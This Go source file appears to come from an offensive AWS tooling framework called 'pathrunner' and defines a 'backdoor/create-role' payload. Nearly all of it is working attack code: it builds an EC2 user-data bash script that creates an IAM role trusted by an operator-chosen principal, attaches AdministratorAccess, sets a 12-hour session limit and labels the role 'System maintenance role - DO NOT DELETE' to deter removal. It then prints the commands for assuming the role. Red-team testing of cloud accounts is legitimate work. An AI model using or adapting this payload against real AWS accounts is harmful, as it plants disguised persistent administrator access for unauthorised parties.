package ec2

import (
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

type BackdoorCreateRolePayload struct{}

func init() {
	payloads.Register(&BackdoorCreateRolePayload{})
}

func (p *BackdoorCreateRolePayload) GetName() string {
	return "backdoor/create-role"
}

func (p *BackdoorCreateRolePayload) GetDescription() string {
	return "Create an IAM role with administrator privileges and custom trust policy via EC2 user-data"
}

func (p *BackdoorCreateRolePayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateRolePayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:user/name) or service (e.g. lambda.amazonaws.com)",
			Required:    true,
		},
		{
			Name:        "ROLE_NAME",
			Description: "Name for the backdoor role (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "EXTERNAL_ID",
			Description: "External ID condition for the trust policy",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "ROLE_PATH",
			Description: "IAM path for the role",
			Required:    false,
			Default:     "/",
		},
	}
}

func (p *BackdoorCreateRolePayload) Validate(options map[string]string) error {
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/create-role payload")
	}
	return nil
}

func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
	trustPrincipal := options["TRUST_PRINCIPAL"]
	roleName := options["ROLE_NAME"]
	externalID := options["EXTERNAL_ID"]
	rolePath := options["ROLE_PATH"]
	if rolePath == "" {
		rolePath = "/"
	}

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	roleNameBash := ""
	if roleName != "" {
		roleNameBash = fmt.Sprintf(`ROLE_NAME="%s"`, roleName)
	} else {
		roleNameBash = `ROLE_NAME="pathrunner-backdoor-$(date +%s)"`
	}

	externalIDCondition := ""
	if externalID != "" {
		externalIDCondition = fmt.Sprintf(`,
                "Condition": {
                    "StringEquals": {
                        "sts:ExternalId": "%s"
                    }
                }`, externalID)
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-create-role.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Create Role Payload"
echo "Trust Principal: %s"
echo ""

sleep 10

%s

TRUST_POLICY=$(cat <<'TRUSTPOLICY'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "%s": "%s"
            },
            "Action": "sts:AssumeRole"%s
        }
    ]
}
TRUSTPOLICY
)

echo "Creating IAM role: $ROLE_NAME..."
CREATE_OUTPUT=$(aws iam create-role \
    --role-name "$ROLE_NAME" \
    --path "%s" \
    --assume-role-policy-document "$TRUST_POLICY" \
    --description "System maintenance role - DO NOT DELETE" \
    --max-session-duration 43200 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not create role: $CREATE_OUTPUT"
    exit 1
fi

ROLE_ARN=$(echo "$CREATE_OUTPUT" | grep -o '"Arn": "[^"]*"' | cut -d'"' -f4)
echo "Role created: $ROLE_ARN"

echo "Attaching AdministratorAccess policy..."
aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
    echo "SUCCESS: Role $ROLE_NAME created with AdministratorAccess"
    echo "Role ARN: $ROLE_ARN"
    echo "Assume command: aws sts assume-role --role-arn $ROLE_ARN --role-session-name pathrunner-session"
else
    echo "FAILED: Could not attach policy"
fi

echo "Create role payload complete"
`, trustPrincipal, roleNameBash, principalKey, trustPrincipal, externalIDCondition, rolePath)

	return userDataScript, nil
}

func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Create Role Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nThe EC2 instance will create a backdoor IAM role on boot.\n")
	output.WriteString("Allow 2-3 minutes for the script to complete.\n\n")

	output.WriteString("To verify:\n")
	output.WriteString("1. Check if the role exists: aws iam get-role --role-name <ROLE_NAME>\n")
	output.WriteString("2. Assume the role: aws sts assume-role --role-arn <ROLE_ARN> --role-session-name pathrunner\n\n")

	output.WriteString("To check script logs:\n")
	output.WriteString("aws ec2 get-console-output --instance-id <INSTANCE_ID>\n")

	return output.String(), nil
}

func (p *BackdoorCreateRolePayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	roleName := options["ROLE_NAME"]
	if roleName == "" {
		roleName = "pathrunner-backdoor-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:role",
			Name:          roleName,
			CleanupMethod: "iam:DeleteRole",
			Metadata: map[string]string{
				"trust_principal": options["TRUST_PRINCIPAL"],
				"role_path":       options["ROLE_PATH"],
			},
		},
	}
}
